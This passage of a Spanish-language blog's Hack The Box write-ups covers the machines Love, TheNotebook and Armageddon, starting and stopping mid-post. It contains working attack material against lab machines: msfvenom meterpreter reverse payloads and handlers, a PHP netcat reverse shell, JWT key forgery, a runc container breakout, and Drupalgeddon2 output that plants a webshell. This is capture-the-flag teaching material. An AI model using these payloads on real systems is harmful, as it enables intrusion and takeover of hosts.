C:\\WINDOWS\\system32\u0026gt; METASPLOIT Creamos un payload de meterpreter, y colocamos a la escucha metasploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 λ ~/htb/love msfvenom --platform Windows -p windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=80 -f exe -o http.exe [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 549 bytes Final size of exe file: 7168 bytes Saved as: http.exe λ ~/htb/love sudo msfconsole -q msf6 \u0026gt; use multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/x64/meterpreter/reverse_http payload =\u0026gt; windows/x64/meterpreter/reverse_http msf6 exploit(multi/handler) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 msf6 exploit(multi/handler) \u0026gt; set lport 80 lport =\u0026gt; 80 msf6 exploit(multi/handler) \u0026gt; run [*] Started HTTP reverse handler on http://10.10.14.17:80 Subimos y ejecutamos el payload en winrm.\n1 2 3 *Evil-WinRM* PS C:\\Users\\Phoebe\\Documents\u0026gt; upload http.exe [... REDACTED ...] *Evil-WinRM* PS C:\\Users\\Phoebe\\Documents\u0026gt; .\\http.exe Obtuvimos una sesion de meterpreter, intentamos ejecutar nuevamente UserAdd.msi pero nos mostro el mismo mensaje, por lo que migramos a otro proceso el cual Phoebe sea el usuario y en este no obtuvimos ningun error aunque el usuario no fue agregado tras ejecutar el archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 msf6 exploit(multi/handler) \u0026gt; run [*] Started HTTP reverse handler on http://10.10.14.17:80 [*] http://10.10.14.17:80 handling request from 10.10.10.239; (UUID: nksydaat) Staging x64 payload (201308 bytes) ... [*] Meterpreter session 1 opened (10.10.14.17:80 -\u0026gt; 10.10.10.239:55031) at 2021-05-10 17:05:52 -0400 meterpreter \u0026gt; getuid Server username: LOVE\\Phoebe meterpreter \u0026gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- [... REDACTED ...] 904 652 svchost.exe 1012 584 dwm.exe 1064 2744 httpd.exe x64 1 LOVE\\Phoebe C:\\xampp\\apache\\bin\\httpd.exe 1088 652 svchost.exe [... REDACTED ...] meterpreter \u0026gt; migrate 1064 [*] Migrating from 4640 to 1064... [*] Migration completed successfully. meterpreter \u0026gt; shell Process 6732 created. Channel 1 created. Microsoft Windows [Version 10.0.19042.867] (c) 2020 Microsoft Corporation. All rights reserved. C:\\xampp\u0026gt;msiexec /quiet /qn /i C:\\Users\\Phoebe\\Documents\\UserAdd.msi msiexec /quiet /qn /i C:\\Users\\Phoebe\\Documents\\UserAdd.msi C:\\xampp\u0026gt;net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator The command completed successfully. SYSTEM Creamos un payload .msi, subimos y ejecutamos, conseguimos una sesion con permisos NT AUTHORITY\\SYSTEM y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 # msfvenom --platform Windows -p windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=80 -f msi -o http.msi meterpreter \u0026gt; upload http.msi [*] uploading : /home/kali/htb/love/http.msi -\u0026gt; http.msi [*] Uploaded 156.00 KiB of 156.00 KiB (100.0%): /home/kali/htb/love/http.msi -\u0026gt; http.msi [*] uploaded : /home/kali/htb/love/http.msi -\u0026gt; http.msi meterpreter \u0026gt; background [*] Backgrounding session 2... msf6 exploit(multi/handler) \u0026gt; run -j [*] Exploit running as background job 1. [*] Exploit completed, but no session was created. [*] Started HTTP reverse handler on http://10.10.14.17:80 msf6 exploit(multi/handler) \u0026gt; sessions -i 2 [*] Starting interaction with 2... meterpreter \u0026gt; shell Process 4644 created. Channel 3 created. Microsoft Windows [Version 10.0.19042.867] (c) 2020 Microsoft Corporation. All rights reserved. C:\\Users\\Phoebe\\Documents\u0026gt;msiexec /quiet /qn /i http.msi msiexec /quiet /qn /i http.msi C:\\Users\\Phoebe\\Documents\u0026gt; [*] http://10.10.14.17:80 handling request from 10.10.10.239; (UUID: ambkmfhb) Staging x64 payload (201308 bytes) ... [*] Meterpreter session 3 opened (10.10.14.17:80 -\u0026gt; 10.10.10.239:55042) at 2021-05-10 17:27:58 -0400 C:\\Users\\Phoebe\\Documents\u0026gt;^Z Background channel 3? [y/N] y meterpreter \u0026gt; background [*] Backgrounding session 2... msf6 exploit(multi/handler) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 meterpreter x64/windows LOVE\\Phoebe @ LOVE 10.10.14.17:80 -\u0026gt; 10.10.10.239:55034 (10.10.10.239) 3 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ LOVE 10.10.14.17:80 -\u0026gt; 10.10.10.239:55042 (10.10.10.239) msf6 exploit(multi/handler) \u0026gt; sessions -i 3 [*] Starting interaction with 3... meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter \u0026gt; cat C:/Users/Administrator/Desktop/root.txt 050062d5c7943f196d3015679257ef67 meterpreter \u0026gt; Tambien existe el exploit exploit/windows/local/always_install_elevated para elevar elevar nuestra shell el cual no tomamos en cuenta.\nUPDATE El Sistema de Votacion tiene una vulnerabilidad que permite ejecutar comandos, vemos un exploit que podemos usar utilizando las credenciales relacionadas a www.love.htb.\n","description":"En Love encontramos un escaner de archivos sin ningun tipo de filtro para archivos locales, tambien, un sistema de votos en donde vemos credenciales, lo que nos dio acceso por WinRM. Para escalar privilegios se muestran dos formas, ambas aprovechando la 'politica' AlwaysInstallElevated.","id":53,"section":"posts","tags":["powerup","alwaysinstallelevated","metasploit","winrm","sqlmap"],"title":"Hack The Box - Love","uri":"https://sckull.github.io/posts/love/"},{"content":"\rEn TheNotebook encontramos una aplicacion utilizando JWT, modificamos el token para validar con una clave propia, lo que nos permitio \u0026quot;escalar privilegios\u0026quot; en la aplicacion, y tras subir un archivo PHP ejecutar comandos. Cambiamos al siguiente usuario utilizando una clave privada dentro de un backup, finalmente escalamos privilegios por medio de Docker.\nNombre TheNotebook OS Linux Puntos 30 Dificultad Media IP 10.10.10.230 Maker mostwanted002\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.7, 5.8, 5.9, 4.1, 4.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[10, 8, 8, 2, 2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} RECON NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # Nmap 7.91 scan initiated Tue Mar 9 17:41:20 2021 as: nmap -p- --min-rate 10000 -oN allports 10.129.85.125 Warning: 10.129.85.125 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.85.125 (10.129.85.125) Host is up (0.084s latency). Not shown: 35296 closed ports, 30237 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Tue Mar 9 17:42:49 2021 -- 1 IP address (1 host up) scanned in 88.35 seconds # Nmap 7.91 scan initiated Tue Mar 9 17:45:08 2021 as: nmap -p 22,80 -sV -sC -oN serviceports 10.129.85.125 Nmap scan report for 10.129.85.125 (10.129.85.125) Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA) | 256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA) |_ 256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: The Notebook - Your Note Keeper Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Mar 9 17:45:19 2021 -- 1 IP address (1 host up) scanned in 10.92 seconds HTTP Encontramos una pagina web en el puerto 80, donde es posible ingresar creando una cuenta.\nGOBUSTER Utilizamos GOBUSTER para busqueda de directorios y archivos, aunque, encontramos las mismas direcciones que se encuentran en la pagina inicial.\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/htb/thenotebook] └─$ gobuster dir -u http://10.129.85.125/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,xml,js -q /login (Status: 200) /register (Status: 200) /admin (Status: 403) /logout (Status: 302) Registramos e ingresamos con un usuario y encontramos la opcion de Notes donde es posible crear notas mediante un titulo y cuerpo. En ninguno de los campos encontramos algun tipo de vulnerabilidad.\nJWT COOKIE Encontramos que la aplicacion está utilizando JSON Web Tokens. Utilizando jwt.io encontramos la estructura del token decodificado, la cual nos proporciona informacion del header y payload, se muestra que, esta utilizando el algoritmo RS256 o RSA Signature con SHA-256, además utiliza el kid o keyid cuyo valor es de una ruta en un puerto local, este ultimo es utilizado para verificar o firmar el token que esta siendo utilizado en la aplicacion. En el payload vemos el username, email y admin_cap. admin_cap probablemente sea utilizado para los permisos o nivel de privilegios de los usuarios. Finalmente vemos la firma.\nADMIN - EDIT JWT COOKIE Para poder \u0026ldquo;modificar\u0026rdquo; los privilegios o permisos del usuario en el token, creamos un nuevo token utilizando jwt.io con una clave privada nuestra, utilizando la informacion del usuario que registramos. Primero creamos nuestra clave privada utilizando ssh-keygen.\n1 ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key En el token modificamos el valor de kid para que apunte hacia nuestra direccion ip y verifique mediante nuestra clave privada el token que creamos. Tambien, modificamos el valor de admin_cap a 1 para intentar \u0026ldquo;elevar\u0026rdquo; nuestro nivel de permisos o privilegios en la aplicacion. Finalmente copiamos y pegamos nuestra clave privada, con esto jwt.io nos generaría nuestro token.\nCreamos un mini servidor con python3 en la carpeta o direccion donde creamos nuestra clave privada. Finalmente utilizamos el token generado, modificando el existente mediante las herramientas de desarrollador de firefox.\nRefrescamos la pagina para que tome nuestro nuevo token y vemos que logramos elevar los privilegios de nuestro usuario, vemos una opcion nueva, en esta es posible ver las notas y subir archivos.\nEn las notas vemos dos interesantes, en la primera Need to fix config, menciona que los archivos PHP son ejecutados y que puede ser un problema potencial para el servidor, en el segundo Backups are scheduled habla sobre backups y menciona que son muy faciles en el servidor.\nwww-data - USER Con la informacion de notas podemos asumir que los archivos PHP aun estan siendo ejecutados, subimos un archivo PHP con una shell inversa, visitamos la url de la ubicacion del archivo y logramos obtener una shell con el usuario www-data.\n1 2 3 \u0026lt;?php exec(\u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.20 1338 \u0026gt;/tmp/f\u0026#39;) ?\u0026gt; Noah - USER Enumeramos la maquina, encontramos en la carpeta backups en /var/ un archivo comprimido, al descomprimir encontramos la clave privada del usuario noah, intentamos utilizar este archivo de manera remota pero no nos permitió ingresar la maquina, por lo que ingresamos de manera local, logramos obtener una shell con este usuario y nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 pwd /var/backups ls -lah ls -lah total 696K drwxr-xr-x 2 root root 4.0K Mar 9 06:28 . drwxr-xr-x 14 root root 4.0K Feb 12 06:52 .. -rw-r--r-- 1 root root 50K Mar 9 06:25 alternatives.tar.0 -rw-r--r-- 1 root root 33K Feb 24 08:53 apt.extended_states.0 -rw-r--r-- 1 root root 3.6K Feb 23 08:58 apt.extended_states.1.gz -rw-r--r-- 1 root root 3.6K Feb 12 06:52 apt.extended_states.2.gz -rw-r--r-- 1 root root 437 Feb 12 06:17 dpkg.diversions.0 -rw-r--r-- 1 root root 172 Feb 12 06:52 dpkg.statoverride.0 -rw-r--r-- 1 root root 559K Feb 24 08:53 dpkg.status.0 -rw------- 1 root root 693 Feb 17 13:18 group.bak -rw------- 1 root shadow 575 Feb 17 13:18 gshadow.bak -rw-r--r-- 1 root root 4.3K Feb 17 09:02 home.tar.gz -rw------- 1 root root 1.6K Feb 12 06:24 passwd.bak -rw------- 1 root shadow 1.0K Feb 12 07:33 shadow.bak www-data@thenotebook:/var/backups$ tar -xvf home.tar.gz -C /tmp/ tar -xvf home.tar.gz -C /tmp/ home/ home/noah/ home/noah/.bash_logout home/noah/.cache/ home/noah/.cache/motd.legal-displayed home/noah/.gnupg/ home/noah/.gnupg/private-keys-v1.d/ home/noah/.bashrc home/noah/.profile home/noah/.ssh/ home/noah/.ssh/id_rsa home/noah/.ssh/authorized_keys home/noah/.ssh/id_rsa.pub www-data@thenotebook:/var/backups$ cd /tmp/home/noah/.ssh www-data@thenotebook:/tmp/home/noah/.ssh$ ls -lah total 20K drwx------ 2 www-data www-data 4.0K Feb 17 08:59 . drwxr-xr-x 5 www-data www-data 4.0K Feb 17 09:02 .. -rw-r--r-- 1 www-data www-data 398 Feb 17 08:59 authorized_keys -rw------- 1 www-data www-data 1.7K Feb 17 08:59 id_rsa -rw-r--r-- 1 www-data www-data 398 Feb 17 08:59 id_rsa.pub cat id_rsa cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04 HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT [... REDACTED ...] Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ= -----END RSA PRIVATE KEY----- www-data@thenotebook:/tmp/home/noah/.ssh$ PRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos sudo (root) para ejecutar el comando /usr/bin/docker exec -it webapp-dev01*. Al intentar ejecutar este comando utilizando pwd (/usr/bin/docker exec -it webapp-dev01* pwd) nos muestra un error, ya que no existe un contenedor que contenga el caracter *, si eliminamos este ultimo caracter el comando se ejecuta.\n1 2 3 4 5 6 7 8 9 10 noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01* \u0026#34;docker exec\u0026#34; requires at least 2 arguments. See \u0026#39;docker exec --help\u0026#39;. Usage: docker exec [OPTIONS] CONTAINER COMMAND [ARG...] Run a command in a running container noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 pwd /opt/webapp noah@thenotebook:~$ Al ejecutar bash obtenemos una shell root en el contenedor, donde estan todos los archivos de la aplicacion web, enumeramos el contenedor pero no encontramos nada para escalar privilegios en el host.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 bash root@0f4c2517af40:/opt/webapp# whoami;id;pwd root uid=0(root) gid=0(root) groups=0(root) /opt/webapp root@0f4c2517af40:/opt/webapp# ls -lah total 52K drwxr-xr-x 1 root root 4.0K Feb 12 07:30 . drwxr-xr-x 1 root root 4.0K Feb 12 07:30 .. drwxr-xr-x 1 root root 4.0K Feb 12 07:30 __pycache__ drwxr-xr-x 3 root root 4.0K Nov 18 13:27 admin -rw-r--r-- 1 root root 3.3K Nov 16 19:43 create_db.py -rw-r--r-- 1 root root 9.3K Feb 11 15:00 main.py -rw------- 1 root root 3.2K Feb 11 15:09 privKey.key -rw-r--r-- 1 root root 78 Feb 12 07:12 requirements.txt drwxr-xr-x 3 root root 4.0K Nov 19 10:57 static drwxr-xr-x 2 root root 4.0K Nov 18 13:47 templates -rw-r--r-- 1 root root 20 Nov 20 09:18 webapp.tar.gz root@0f4c2517af40:/opt/webapp# DOCKER Verificamos la version de docker y realizamos una busqueda de exploits para esta version, vemos algunos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #TheNotebook - Host noah@thenotebook:~$ docker --version Docker version 18.06.0-ce, build 0ffa825 noah@thenotebook:~$ #Kali ┌──(kali㉿kali)-[~/htb/thenotebook/tmp] └─$ searchsploit docker 18 --------------------------------------------------------------------------- Exploit Title | Path --------------------------------------------------------------------------- Docker 0.11 - VMM-Container Breakout | linux/local/33808.c runc \u0026lt; 1.0-rc6 (Docker \u0026lt; 18.09.2) - Container Breakout (1) | linux/local/46359.md runc \u0026lt; 1.0-rc6 (Docker \u0026lt; 18.09.2) - Container Breakout (2) | linux/local/46369.md --------------------------------------------------------------------------- Shellcodes: No Results Vemos algunos exploits que podrian afectar a la version de docker que se presenta, se define la explicacion:\n\u0026hellip; runc es la herramienta de bajo nivel que hace el trabajo pesado de generar un contenedor Linux. Otras herramientas como Docker, Containerd y CRI-O se encuentran en la parte superior de runc para lidiar con cosas como el formateo y la serialización de datos, pero runc está en el corazón de todos estos sistemas.\nLa vulnerabilidad se da: \u0026hellip; cuando se ejecuta un proceso como root dentro de un contenedor, ese proceso puede aprovechar un error en runc para obtener privilegios de root en el host que ejecuta el contenedor \u0026hellip;\nUtilizamos el exploit runc \u0026lt; 1.0-rc6 (Docker \u0026lt; 18.09.2) - Container Breakout (1) para escalar privilegios:\nEditamos el archivo payload.c donde agregamos nuestra ip y puerto, además ponemos a la escucha con netcat en el puerto especificado. Compilamos el archivo exploit y payload: make. Descargamos los archivos dentro del contenedor utilizando wget. Al tener los archivos dentro, ejecutamos pwn.sh. En otra shell con noah ejecutamos sudo /usr/bin/docker exec -it webapp-dev01 sh lo que ejecutará el archivo exploit y este ultimo el archivo payload que contiene una shell inversa, con lo cual logramos obtener una shell root y nuestra flag root.txt. PAYLOAD Durante la ejecucion de este exploit se dio el \u0026ldquo;error\u0026rdquo; de que la shell inversa no se ejecutaba correctamente por lo que en el caso anterior se utilizó este payload.\nUPDATE NOAH SHELL Inicialmente se utilizó la shell del usuario www-data para cambiar al usuario noah ya que la clave id_rsa del archivo home.tar.gz no dejaba ingresar remotamente, pero al tener una shell con noah, dentro de su directorio .ssh encontramos una clave privada con la cual si es posible ingresar remotamente.\n","description":"En TheNotebook encontramos una aplicacion utilizando JWT, modificamos el token para validar con una clave propia, lo que nos permitio \"escalar privilegios\" en la aplicacion, y tras subir un archivo PHP ejecutar comandos. Cambiamos al siguiente usuario utilizando una clave privada dentro de un backup, finalmente escalamos privilegios por medio de Docker.","id":54,"section":"posts","tags":["jwt","docker"],"title":"Hack The Box - TheNotebook","uri":"https://sckull.github.io/posts/thenotebook/"},{"content":"\rArmageddon una maquina de HackTheBox con SO Linux, encontramos una version de Drupal desactualizada por donde obtuvimos acceso. Tras obtener credenciales de una base de datos cambiamos a un siguiente usuario, y, con este ultimo escalamos privilegios creando un paquete de snap.\nNombre Armageddon OS Linux Puntos 20 Dificultad Facil IP 10.10.10.233 Maker bertolis\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5, 4.6, 5.8, 4.2, 5.4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} RECON NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # Nmap 7.91 scan initiated Sun Mar 28 01:55:48 2021 as: nmap -Pn -p- --min-rate 10000 -oN allports 10.10.10.233 Warning: 10.10.10.233 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.233 (10.10.10.233) Host is up (0.097s latency). Not shown: 41553 filtered ports, 23980 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Sun Mar 28 01:57:23 2021 -- 1 IP address (1 host up) scanned in 95.32 seconds # Nmap 7.91 scan initiated Sun Mar 28 01:58:26 2021 as: nmap -Pn -sV -sC -p 22,80 -oN serviceports 10.10.10.233 Nmap scan report for 10.10.10.233 (10.10.10.233) Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-generator: Drupal 7 (http://drupal.org) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Welcome to Armageddon | Armageddon Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Mar 28 01:58:44 2021 -- 1 IP address (1 host up) scanned in 17.45 seconds DRUPAL Encontramos en el puerto 80 Drupal en su version 7 y basandonos en el archivo CHANGELOG.txt e /includes/bootstrap.inc podriamos confirmar que la version es 7.56.\n1 2 3 4 5 6 7 8 9 10 11 12 HTTP/1.1 200 OK Date: Sun, 28 Mar 2021 06:03:20 GMT Server: Apache/2.4.6 (CentOS) PHP/5.4.16 X-Powered-By: PHP/5.4.16 Expires: Sun, 19 Nov 1978 05:00:00 GMT Cache-Control: no-cache, must-revalidate X-Content-Type-Options: nosniff Content-Language: en X-Frame-Options: SAMEORIGIN X-Generator: Drupal 7 (http://drupal.org) Content-Length: 7440 Content-Type: text/html; charset=utf-8 1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~/htb/armageddon] └─$ curl -s http://10.10.10.233/CHANGELOG.txt | head Drupal 7.56, 2017-06-21 ----------------------- - Fixed security issues (access bypass). See SA-CORE-2017-003. ┌──(kali㉿kali)-[~/htb/armageddon] └─$ curl -s http://10.10.10.233/includes/bootstrap.inc|grep \u0026#34;define(\u0026#39;VERSION\u0026#39;\u0026#34; define(\u0026#39;VERSION\u0026#39;, \u0026#39;7.56\u0026#39;); GOBUSTER Gobustter mostró direcciones que pertenecen a drupal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ┌──(kali㉿kali)-[~/htb/armageddon] └─$ gobuster dir -u http://10.10.10.233/ -w /usr/share/wordlists/dirb/common.txt -t 150 -q -x php,html,txt,xml,py,pl,sh,bak /1 (Status: 200) /cgi-bin/ (Status: 403) /cgi-bin/.html (Status: 403) /includes (Status: 301) /install.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /LICENSE.txt (Status: 200) /misc (Status: 301) /modules (Status: 301) /profiles (Status: 301) /README.txt (Status: 200) /scripts (Status: 301) /sites (Status: 301) /themes (Status: 301) /update.php (Status: 403) /web.config (Status: 200) /xmlrpc.php (Status: 200) /xmlrpc.php (Status: 200) DRUPALGEDDON Realizamos una busqueda de las versiones más cercanas a Drupal 7.56 la cual tenga un exploit o vulnerabilidad. Encontramos Drupalgeddon2 y Drupalgeddon3 las más sobresalientes.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(kali㉿kali)-[~/htb/armageddon] └─$ searchsploit drupal 7.56 130 ⨯ ------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------ --------------------------------- Drupal \u0026lt; 7.58 - \u0026#39;Drupalgeddon3\u0026#39; (Authenticated) Remote Code (Metasploit) | php/webapps/44557.rb Drupal \u0026lt; 7.58 - \u0026#39;Drupalgeddon3\u0026#39; (Authenticated) Remote Code Execution (PoC) | php/webapps/44542.txt Drupal \u0026lt; 7.58 / \u0026lt; 8.3.9 / \u0026lt; 8.4.6 / \u0026lt; 8.5.1 - \u0026#39;Drupalgeddon2\u0026#39; Remote Code Execution | php/webapps/44449.rb Drupal \u0026lt; 8.3.9 / \u0026lt; 8.4.6 / \u0026lt; 8.5.1 - \u0026#39;Drupalgeddon2\u0026#39; Remote Code Execution (Metasploit) | php/remote/44482.rb Drupal \u0026lt; 8.3.9 / \u0026lt; 8.4.6 / \u0026lt; 8.5.1 - \u0026#39;Drupalgeddon2\u0026#39; Remote Code Execution (PoC) | php/webapps/44448.py Drupal \u0026lt; 8.5.11 / \u0026lt; 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit) | php/remote/46510.rb Drupal \u0026lt; 8.6.10 / \u0026lt; 8.5.11 - REST Module Remote Code Execution | php/webapps/46452.txt Drupal \u0026lt; 8.6.9 - REST Module Remote Code Execution | php/webapps/46459.py ------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results La vulnerabilidad de la cual Drupalgeddon2 se aprovecha se encuentra en la \u0026ldquo;API\u0026rdquo; de Formularios de Drupal.\nAPACHE - USER Encontramos un exploit el cual realiza la explotacion para Drupalgeddon2 con la cual logramos ejecutar comandos como usuario Apache con una simple webshell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 ──(kali㉿kali)-[~/htb/armageddon] └─$ ruby drupalgeddon2.rb Usage: ruby drupalggedon2.rb \u0026lt;target\u0026gt; [--authentication] [--verbose] Example for target that does not require authentication: ruby drupalgeddon2.rb https://example.com Example for target that does require authentication: ruby drupalgeddon2.rb https://example.com --authentication ┌──(kali㉿kali)-[~/htb/armageddon] └─$ ruby drupalgeddon2.rb http://10.129.89.116/ [*] --==[::#Drupalggedon2::]==-- -------------------------------------------------------------------------------- [i] Target : http://10.129.89.116/ -------------------------------------------------------------------------------- [+] Found : http://10.129.89.116/CHANGELOG.txt (HTTP Response: 200) [+] Drupal!: v7.56 -------------------------------------------------------------------------------- [*] Testing: Form (user/password) [+] Result : Form valid - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Clean URLs [!] Result : Clean URLs disabled (HTTP Response: 404) [i] Isn\u0026#39;t an issue for Drupal v7.x -------------------------------------------------------------------------------- [*] Testing: Code Execution (Method: name) [i] Payload: echo ECWIGPQW [+] Result : ECWIGPQW [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO! -------------------------------------------------------------------------------- [*] Testing: Existing file (http://10.129.89.116/shell.php) [i] Response: HTTP 404 // Size: 5 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [*] Testing: Writing To Web Root (./) [i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php [+] Result : \u0026lt;?php if( isset( $_REQUEST[\u0026#39;c\u0026#39;] ) ) { system( 